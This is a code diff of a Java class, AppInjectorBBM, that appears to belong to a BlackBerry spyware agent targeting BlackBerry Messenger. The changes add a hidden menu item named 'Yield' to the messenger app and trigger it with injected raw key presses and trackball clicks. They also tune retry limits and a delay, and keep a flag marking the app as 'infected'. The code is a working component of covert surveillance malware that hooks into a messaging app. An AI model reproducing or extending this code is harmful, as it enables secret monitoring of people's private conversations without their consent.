@@ -2,6 +2,7 @@ package blackberry.agent.im;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
+import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.AppInjectorInterface;
@@ -9,13 +10,22 @@ import blackberry.injection.KeyInjector;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.Utils;
 
+/**
+ * Free letters: qwrtyudfgjklzbnm
+ * bbm
+ * @author zeno
+ *
+ */
 public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     //#ifdef DEBUG
     private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE);
     //#endif
-    
+
     private static AppInjectorBBM instance;
     private static final long GUID = 0xcb37fa94a62baf5dL;
+    private static final int DELAY = 10000;
+    
+    private int tries =0;
 
     public static synchronized AppInjectorBBM getInstance() {
         if (instance == null) {
@@ -41,7 +51,7 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         //#ifdef DEBUG
         debug.trace("injectMenu");
         //#endif
-        menu.addMenuBBM();
+        menu.addMenuBBM("Yield");
         return true;
     }
 
@@ -53,61 +63,59 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         return true;
     }
 
-    public boolean callMenuByKey(int kind) {
+    public boolean callMenuByKey() {
         //#ifdef DEBUG
-        debug.info("calling browser menu");
+        debug.info("calling bbm menu: "
+                + UiApplication.getUiApplication().getActiveScreen());
         //#endif
 
-        
-        //KeyInjector.pressKeyCode(Keypad.KEY_MENU);
-       
-        if(kind % 2 ==0){
+        if(tries++ >= 3){
             //#ifdef DEBUG
-            debug.trace("callMenuByKey press raw key");
+            debug.error("callMenuByKey: too many tries");
             //#endif
-            KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-            Utils.sleep(100);
-            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-            Utils.sleep(100);
-            KeyInjector.trackBallRawClick();
-            //KeyInjector.trackBallClick();
-        }else{
-            //#ifdef DEBUG
-            debug.trace("callMenuByKey press key");
-            //#endif
-            KeyInjector.pressKeyCode(Keypad.KEY_MENU);
-            Utils.sleep(500);
-            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
-            Utils.sleep(500);
-            KeyInjector.trackBallClick();
+            return false;
         }
+        
+        //#ifdef DEBUG
+        debug.trace("callMenuByKey press raw key");
+        //#endif
+        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        Utils.sleep(100);
+        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+        Utils.sleep(100);
+        KeyInjector.trackBallRawClick();
+        //KeyInjector.trackBallClick();
 
         return true;
     }
-
 
     public String getAppName() {
 
         return "Messenger";
     }
 
-
     public void callMenuInContext() {
         //#ifdef DEBUG
         debug.trace("callMenuInContext");
         //#endif
         BBMMenuItem.getInstance().checkForConversationScreen();
-        
+
     }
-    
+
     boolean infected;
+
     public boolean isInfected() {
-        
+
         return infected;
     }
 
     public void setInfected() {
-       infected = true;
+        infected = true;
+    }
+
+    public int getDelay() {
+
+        return DELAY;
     }
 
 }
